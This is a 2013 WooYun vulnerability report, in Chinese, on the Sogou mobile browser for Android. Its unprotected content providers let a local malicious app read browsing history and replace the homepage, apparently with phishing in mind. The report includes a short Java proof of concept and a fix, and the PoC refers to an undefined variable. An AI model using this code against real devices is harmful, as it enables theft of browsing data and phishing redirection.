{"id": 7181, "wybug_id": "wooyun-2013-042609", "wybug_title": "搜狗手机浏览器隐私泄露和主页篡改漏洞二合一（需要手机里有恶意应用）", "wybug_corp": "搜狐", "wybug_author": "Pentest.mobi", "wybug_date": "2013-11-11 18:57", "wybug_open_date": "2013-12-26 18:58", "wybug_type": "敏感信息泄露", "wybug_level": "低", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-26：\t细节向公众公开  简要描述： 搜狗手机浏览器存在漏洞，恶意攻击者利用本地的恶意app盗取用户的浏览记录隐私，修改浏览器主页为任意的钓鱼网站。 详细说明：  漏洞原因：几个重要的content provider都没做任何权限限制。攻击代码：\nUri contentUri2 = Uri.parse(\"content://sogou.mobile.explorer/quicklaunch\");        Cursor c = getContentResolver().query(contentUri1, null, null, null, null);        String xc =\"\";        if (c.moveToFirst()) {\t\t\tfor (int i = 0; i < c.getCount(); i++) {\t\t\t\t\t\t c.moveToPosition(i);\t\t\t\t\t\t String title = c.getString(1);\t\t\t\t\t\t String url = c.getString(2);\t\t\t\t\t\t xc=xc + title + \":\" + url + \"\\r\\n\";\t\t\t}\t\t}        ContentValues test = new ContentValues();           test.put(\"url\", \"http://www.qq.com\");        int xxx = getContentResolver().update(contentUri2,test,\"_id=?\",new String[]{\"1\"});\n   漏洞证明：  我没有打开草榴 - -！！！\n\n点击SOHU，打开的是QQ.com,如果是钓鱼呢 - -！！\n\n\n\n   修复方案：  对content provider做权限限制。   版权声明：转载请注明来源 Pentest.mobi@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-11-11 19:08 厂商回复： 感谢支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-12 07:42 |    \t\tPentest.mobi \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:9        | 手机安全)\t\t \n  囧，只给5分，两个漏洞应该分别给5分，最少10分。另外可以篡改数据的漏洞可不能评低，在app漏洞里至少要评个中，我要是篡改成file 协议的文件又可以衍生出其他信息泄露漏洞了。    \n     2013-11-12 08:14 |    \t\t搜狐(乌云厂商)\t\t \n  @Pentest.mobi 分的确打低了，sorry,没法改了，下次补上：）    \n     2013-11-12 09:16 |    \t\t三克油 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 初学者)\t\t \n  哦  这个  很好 把主页改成这个  mm.boygg.com    \n     2013-11-12 10:03 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @搜狐 利用难度大 差不多了    \n     2013-11-12 11:08 |    \t\tPentest.mobi \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:9        | 手机安全)\t\t \n  @xsser  WooYun: 新浪微博Android应用本地信息泄露 同样的漏洞给了10分 我还是2个 一个信息泄露 一个篡改双重标准？    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}